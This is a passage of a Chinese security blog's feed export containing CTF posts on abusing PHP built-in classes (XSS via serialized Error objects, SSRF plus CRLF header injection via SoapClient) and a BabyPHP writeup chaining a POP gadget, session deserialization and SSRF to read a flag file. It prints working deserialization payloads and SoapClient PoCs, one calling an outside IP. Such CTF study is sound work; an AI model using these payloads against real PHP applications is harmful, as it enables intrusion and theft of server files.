href="https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/</a></p><h5 id="原生类概念"><a href="#原生类概念" class="headerlink" title="原生类概念"></a>原生类概念</h5><p>原生类就是php内置类，不用定义php自带的类，即不需要在当前脚本写出，但也可以实例化的类。</p><blockquote><p><strong>PHP原生类就是在标准PHP库中已经封装好的类</strong>，而在其中，有些类具有一些功能，例如文件读取、目录遍历等，这就给了我们可乘之机，我们只需要实例化这些类，就可以实现文件读取这种敏感操作。</p><p>在CTF中，有时会遇到一些奇怪的题，比如没有给出反序列化的类，这个时候可能就需要用到PHP原生类了</p></blockquote><p>常见的做题会遇见的类有</p><ul><li>Error</li><li>Exception</li><li>SoapClient</li><li>DirectoryIterator</li><li>SimpleXMLElement</li><li>SplFileObject</li><li>…</li></ul><p>这些类里面都有一些自带的方法，合理利用可以达到意想不到的效果。</p><h5 id="XSS-By-Error-Exception"><a href="#XSS-By-Error-Exception" class="headerlink" title="XSS By Error&#x2F;Exception"></a>XSS By Error&#x2F;Exception</h5><h6 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h6><p>Error 适用于PHP7版本【在开启报错的前提下】，Exception则PHP5和PHP7都可以【在开启报错的前提下】。</p><h6 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h6><p><code>Error</code>类中含有一个<code>__tostring</code>魔术方法，如果把它当做字符串使用，就会触发该魔术方法。例如我们对其进行输出操作(<code>echo</code>)，此时就会自动调用<code>__tostring</code>魔术方法，如果<code>Error</code>类中内容为<code>XSS</code>恶意语句，此时就会导致XSS</p><h6 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> $a = unserialize($_GET[&#x27;a&#x27;]);</span><br><span class="line"> echo $a;</span><br><span class="line"> ?&gt; </span><br></pre></td></tr></table></figure><p>这个例子中，echo了一个对象，并且没有给出反序列化的类，这个时候就要考虑原生类并且关注_tostring这个方法了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> $a = new Error(&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;);//Exception直接替换Error</span><br><span class="line"> echo urlencode(serialize($a));  </span><br><span class="line"> //O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A39%3A%22D%3A%5CphpStudy%5CPHPTutorial%5CWWW%5Chtml%5Cqq.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>echo的时候，直接触发Error类里面的_tostring,直接执行js代码实现xss。</p><h5 id="SSRF-By-SoapClient"><a href="#SSRF-By-SoapClient" class="headerlink" title="SSRF By SoapClient"></a>SSRF By SoapClient</h5><p>PHP 的内置类 SoapClient 是一个专门用来<strong>访问web服务</strong>的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p><p>类摘要：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> SoapClient &#123;</span><br><span class="line">     /* 方法 */</span><br><span class="line">     public __construct ( stringnull $wsdl , array $options = [] )</span><br><span class="line">     public __call ( string $name , array $args ) : mixed</span><br><span class="line">     public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : stringnull</span><br><span class="line">     public __getCookies ( ) : array</span><br><span class="line">     public __getFunctions ( ) : arraynull</span><br><span class="line">     public __getLastRequest ( ) : stringnull</span><br><span class="line">     public __getLastRequestHeaders ( ) : stringnull</span><br><span class="line">     public __getLastResponse ( ) : stringnull</span><br><span class="line">     public __getLastResponseHeaders ( ) : stringnull</span><br><span class="line">     public __getTypes ( ) : arraynull</span><br><span class="line">     public __setCookie ( string $name , stringnull $value = null ) : void</span><br><span class="line">     public __setLocation ( string $location = &quot;&quot; ) : stringnull</span><br><span class="line">     public __setSoapHeaders ( SoapHeaderarraynull $headers = null ) : bool</span><br><span class="line">     public __soapCall ( string $name , array $args , arraynull $options = null , SoapHeaderarraynull $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>可以看到有一个__call 方法，当__call 方法被触发后，它可以<strong>发送 HTTP 和 HTTPS 请求</strong>。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p><blockquote><p>SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP 是一种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会去调用 __call 方法。</p></blockquote><p>利用这一点构造poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> $a = new SoapClient(null,array(&#x27;location&#x27;=&gt;&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;, &#x27;uri&#x27;=&gt;&#x27;http://47.xxx.xxx.72:2333&#x27;));</span><br><span class="line"> $b = serialize($a);</span><br><span class="line"> echo $b;</span><br><span class="line"> $c = unserialize($b);</span><br><span class="line"> $c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>但是，由于它仅限于HTTP&#x2F;HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。</p><p>如何ssrf和crlf组合拳？</p><blockquote><p>ssrf利用SoapClient去发出http请求并通过 <code>SoapClient</code> 来设置 <code>User-Agent</code> ，将原来的 <code>Content-Type</code> 挤下去，从而再插入一个新的 <code>Content-Type</code> 或者其他的请求头数据。【content-type是因为我们要上传post数据，需要把content-tyoe改为application&#x2F;x-www-form-urlencoded。】</p></blockquote><p>某CTF题目复现：</p><p><a href="https://www.anquanke.com/post/id/238482#h3-12">https://www.anquanke.com/post/id/238482#h3-12</a> [详细]</p><p><a href="http://psych.green/psych/web/ctf/%e7%ac%ac%e4%ba%94%e5%b1%8a%e5%ae%89%e6%b4%b5%e6%9d%af-2022-web-writeup.html#BabyPHP">http://psych.green/psych/web/ctf/%e7%ac%ac%e4%ba%94%e5%b1%8a%e5%ae%89%e6%b4%b5%e6%9d%af-2022-web-writeup.html#BabyPHP</a> [安洵杯BabyPHP，个人博客]</p><p><a href="https://www.cnblogs.com/20175211lyz/p/11515519.html">https://www.cnblogs.com/20175211lyz/p/11515519.html</a> [LCTF]</p><p>[LCTF]整体思路：</p><ul><li>题目要求当REMOTE_ADDR等于127.0.0.1时，就会在session中插入flag，就能得到flag。所以我们想办法利用ssrf去修改请求，让REMOTE_ADDR等于127.0.0.1 &lt;?php<br> $target &#x3D; “<a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a>“;<br> $attack &#x3D; new SoapClient(null,array(‘location’ &#x3D;&gt; $target,<br>     ‘user_agent’ &#x3D;&gt; “N0rth3ty\r\nCookie: PHPSESSID&#x3D;tcjr6nadpk3md7jbgioa6elfk4\r\n”,<br>     ‘uri’ &#x3D;&gt; “123”));<br> $payload &#x3D; urlencode(serialize($attack));<br> echo $payload;</li><li>这里这个POC就是利用CRLF伪造本地请求SSRF去访问flag.php，并将得到的flag结果保存在cookie为 <code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code> 的session中。</li><li>现在flag被我们存储在了cookie为 <code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code> 的session中，我们要想办法进入这个session</li><li>要想办法序列化这个对象，但是源代码并没有可以直接利用的可以序列化的地方，又在题目里面找到了一个session_start()函数，我们就想办法通过session反序列化来做</li><li>题目中比较关键的函数就是<code>call_user_fun($b,$a)</code>，我们知道<code>call_user_func()</code>是把第一个参数作为函数第二个参数作为函数传入的值。或者把第一个参数作为类名，第二个参数作为方法名。</li><li>我们构造<code>call_user_fun(seesioon_start,serialize_handler=php_serialize)</code>然后通过session反序列化，我们成功将我们php原生类SoapClient构造的payload传入了 <code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code> 的session中，当页面重新加载时，就会自动将其反序列化</li><li>现在我们需要触发SoapClient里面的<code>__call</code>来造成ssrf，所以我们需要访问一个SoapClient里面的不存在的方法名</li><li>把<code>call_user_fun($b,$a)</code>【其中$a &#x3D; array(reset($_SESSION), ‘welcome_to_the_lctf2018’);】构造成`call_user_func(call_user_func, array(reset($_SESSION), ‘welcome_to_the_lctf2018’));`成功触发call方法。</li><li>最后，我们第三次传参，用我们POC里面自己设置的cookie（<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>）去访问这个页面，<code>var_dump($_SESSION);</code> 会将 <code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code> 的这个session内容输出出来，即可得到flag</li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第五届安洵杯-2022-web-writeup</title>
      <link href="/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/"/>
      <url>/2023/07/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF-2022-web-writeup/</url>
      
        <content type="html"><![CDATA[<p>题目：</p><ul><li>Babyphp(2022安洵杯)</li><li>Babyweb(2023安洵杯春季赛)</li></ul><hr><h2 id="Babyphp-2022安洵杯"><a href="#Babyphp-2022安洵杯" class="headerlink" title="Babyphp(2022安洵杯)"></a>Babyphp(2022安洵杯)</h2><p>官方wp：<a href="https://bbs.kanxue.com/thread-275369.htm">https://bbs.kanxue.com/thread-275369.htm</a></p><h2 id="BabyPHP"><a href="#BabyPHP" class="headerlink" title="BabyPHP"></a>BabyPHP</h2><p>知识点：session反序列化（pop链）-&gt;soap(ssrf+crlf)-&gt;call_user_func激活soap类</p><p><a href="https://www.cnblogs.com/20175211lyz/p/11515519.html">参考博客1</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2NDgyNTAzMw==&mid=2247484241&idx=1&sn=76c9bba70fd81bffa4f4d6919d7b98cd&chksm=ce6238f7f915b1e15b477d625f08c318de6c0532079d8c22a135e410b964c9dc3234f13db680&mpshare=1&scene=23&srcid=1128PSR0BFXYuDzkmnCay6z3&sharer_sharetime=1669595430468&sharer_shareid=93d3023652ea1e4f581f6748f20cfe90#rd">参考博客2</a></p><p>题目源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">///index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//something in flag.php</span><br><span class="line"></span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a = &quot;babyhacker&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        if (isset($this-&gt;a) &amp;&amp; $this-&gt;a == md5($this-&gt;a)) &#123;         //md5，0e绕过</span><br><span class="line">            $this-&gt;b-&gt;uwant();                                      // b是class C</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $k;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;b = $this-&gt;k;</span><br><span class="line">        die($this-&gt;a);                    //跳到tostring()所以$this-&gt;a=class C</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $c;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $cc = $this-&gt;c;</span><br><span class="line">        return $cc();                  //调用函数，预计跳到A里面的invoke</span><br><span class="line">    &#125;</span><br><span class="line">    public function uwant()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;a == &quot;phpinfo&quot;) &#123;          //a=phpinfo可以直接看PHPinfo</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            call_user_func(array(reset($_SESSION), $this-&gt;a));        //或者重写a</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;d0g3&#x27;])) &#123;             </span><br><span class="line">    ini_set($_GET[&#x27;baby&#x27;], $_GET[&#x27;d0g3&#x27;]);  //ini_set(&#x27;session.serialize_handler&#x27;, &#x27;设置的引擎&#x27;);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&#x27;sess&#x27;] = $_POST[&#x27;sess&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    session_start();</span><br><span class="line">    if (isset($_POST[&quot;pop&quot;])) &#123;</span><br><span class="line">        unserialize($_POST[&quot;pop&quot;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">///flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//flag在根目录下</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;          //ssrf</span><br><span class="line">    $f1ag=implode(array(new $_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;])));</span><br><span class="line">    $_SESSION[&quot;F1AG&quot;]= $f1ag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   echo &quot;only localhost!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h3><p>链子触发是通过<code>unserialize($_POST[&quot;pop&quot;]);</code>；反序列化post的pop。</p><p>链子入口是class b里面的 <code>__destruct()</code>;</p><p>链子的跳板就是class a 里面的 <code>__invoke()</code>;</p><p>链子的出口应该是class c里面的<code>__uwant</code> <code>call_user_func(array(reset($_SESSION), $this-&gt;a));</code></p><blockquote><p><code>call_user_func</code>:把第一个参数作为回调函数调用,数组中第一个元素为类名，第二个元素为类方法。【第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。 <strong>前者函数后者参数</strong>】，session这个函数就很可疑了</p><p><code>reset</code>:输出数组中的当前元素和下一个元素的值，然后把数组的内部指针重置到数组中的第一个元素</p><p>也就是说:reset() 函数将内部指针指向数组中的第一个元素，并输出。</p></blockquote><h4 id="pop链-1"><a href="#pop链-1" class="headerlink" title="pop链"></a>pop链</h4><p>链子 B-&gt;a&#x3D;class C -&gt; C-&gt;c&#x3D;class A -&gt; A -&gt;a&#x3D;0e··· ; A-&gt;b&#x3D;class C</p><p><strong>class B __destruct -&gt; class C __tostring()-&gt;class A __invoke -&gt;class C __uwant</strong></p><h4 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $a = &#x27;0e215962017&#x27;;</span><br><span class="line">    public $b;</span><br><span class="line">       public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        if (isset($this-&gt;a) &amp;&amp; $this-&gt;a == md5($this-&gt;a)) &#123;</span><br><span class="line">            $this-&gt;b-&gt;uwant();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $k;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;b = $this-&gt;k;</span><br><span class="line">        die($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C </span><br><span class="line">&#123;</span><br><span class="line">      public $a ;</span><br><span class="line">      public $c;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $cc = $this-&gt;c;</span><br><span class="line">        return $cc();</span><br><span class="line">    &#125;</span><br><span class="line">    public function uwant()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;a == &quot;phpinfo&quot;) &#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            call_user_func(array(reset($_SESSION), $this-&gt;a));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">$b = new B();</span><br><span class="line">$c = new C();</span><br><span class="line">$b -&gt; a = $c;</span><br><span class="line">$b -&gt;a -&gt; c = $a</span><br><span class="line">$a -&gt; b = $c;</span><br><span class="line">$c -&gt; a = &#x27;phpinfo&#x27;;</span><br><span class="line">echo (serialize($b));</span><br></pre></td></tr></table></figure><p>得到payload</p><p><code>O:1:&quot;B&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:11:&quot;0e215962017&quot;;s:1:&quot;b&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;c&quot;;N;&#125;&#125;&#125;s:1:&quot;b&quot;;N;s:1:&quot;k&quot;;N;&#125;</code></p><p>改一下参数绕过wakeup</p><p><code>O:1:&quot;B&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;O:1:&quot;A&quot;:3:&#123;s:1:&quot;a&quot;;s:11:&quot;0e215962017&quot;;s:1:&quot;b&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;c&quot;;N;&#125;&#125;&#125;s:1:&quot;b&quot;;N;s:1:&quot;k&quot;;N;&#125;</code></p><h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><p>思路： <strong>session反序列+soap(ssrf+crlf)+call_user_func激活soap类</strong></p><h6 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;d0g3&#x27;])) &#123;             </span><br><span class="line">    ini_set($_GET[&#x27;baby&#x27;], $_GET[&#x27;d0g3&#x27;]);  //ini_set(&#x27;session.serialize_handler&#x27;, &#x27;设置的引擎&#x27;);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&#x27;sess&#x27;] = $_POST[&#x27;sess&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br></pre></td></tr></table></figure><ul><li>对于这段代码，我们<code>ini_set($_GET[&#39;baby&#39;], $_GET[&#39;d0g3&#39;]); 构造成ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);</code>[之前phpinfo可以查看到本来的引擎为php]</li><li>然后<code>$_SESSION[&#39;sess&#39;] = $_POST[&#39;sess&#39;];</code>这里允许我们设置一个sess变量的session，也就对应<code>call_user_func</code>里面的<code>call_user_func(array(reset($_SESSION), $this-&gt;a));</code>中的<code>reset($_SESSION)</code>这个时候我们让sess为SoapClient这个类，a随便取一个不存在的函数，则原来这句话就变成了<code>call_user_func(SoapClient-&gt;aaa));</code>，就能成功触发soapcilent-&gt;__call从而进行ssrf。</li><li>现在就是想办法通过pop链触发<code>call_user_func(array(reset($_SESSION), $this-&gt;a));</code>从而ssrf。</li><li>这个时候就是运用session的机制</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1/&#x27;,&#x27;http://127.0.0.1/flag.php?a=GlobIterator&amp;b=/f*&#x27; ));            </span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">//利用SoapClient调用__call来发起http请求访问flag.php，绕过only localhost的限制</span><br></pre></td></tr></table></figure><ul><li>我们先利用crlf伪造请求去访问flag.php并将结果保存在cookie为session&#x3D;【执行后的sessionID】中</li><li>于是我们先传sess为上述的poc【注意格式 <code>序列化内容</code>】</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;d0g3&#x27;])) &#123;             </span><br><span class="line">    ini_set($_GET[&#x27;baby&#x27;], $_GET[&#x27;d0g3&#x27;]);  //ini_set(&#x27;session.serialize_handler&#x27;, &#x27;设置的引擎&#x27;);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&#x27;sess&#x27;] = $_POST[&#x27;sess&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    session_start();</span><br><span class="line">    if (isset($_POST[&quot;pop&quot;])) &#123;</span><br><span class="line">        unserialize($_POST[&quot;pop&quot;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br></pre></td></tr></table></figure><ul><li>首先是进入第一个if语句，sess传进去，然后不传dog3</li><li>就会进入else，先session start读取我们传的sess，并且反序列化pop，我们这个时候传构造的链子，触发call_user_func，里面的reset(session)就是我们构造的SoapClient咯</li><li>于是成功获得flag，存进一个新的session里面</li><li>复制一下seesion，访问index.php，输出flag</li></ul><hr><h6 id="抄：hurrison佬的wp"><a href="#抄：hurrison佬的wp" class="headerlink" title="抄：hurrison佬的wp"></a>抄：hurrison佬的wp</h6><p>查看 phpinfo发现session.serialize_handler&#x3D;php，<code>ini_set($_GET[&#39;baby&#39;], $_GET[&#39;d0g3&#39;]);</code>可以设置 php_serialize</p><p>利用session序列化不一致，根据flag.php， 构造$_SESSION[‘sess’] 对象，到 call_user_func(…) 执行，那么可以用 SoapClient 调用任意不存在的方法造成ssrf访问flag.php</p><p>首先根据提示，利用GlobIterator查找根目录文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1/&#x27;,&#x27;http://127.0.0.1/flag.php?a=GlobIterator&amp;b=/f*&#x27; ));            </span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">//利用SoapClient调用__call来发起http请求访问flag.php，绕过only localhost的限制</span><br></pre></td></tr></table></figure><p>通过 <code>var_dump($_SESSION);</code> 拿到 sessionid 设置后再访问，拿到flag文件名 <code>f1111llllllaagg</code></p><p>另解：<code>new DirextoryIterator(&#39;glod://f*&#39;)</code></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230707013038305-1024x357.png"></p><p>再利用SplFileObject读flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &#x27;http://127.0.0.1/flag.php?a=SplFileObject&amp;b=/f1111llllllaagg&#x27;, &#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1/&#x27;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br></pre></td></tr></table></figure><h6 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?baby=session.serialize_handler&amp;d0g3=php_serialize</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 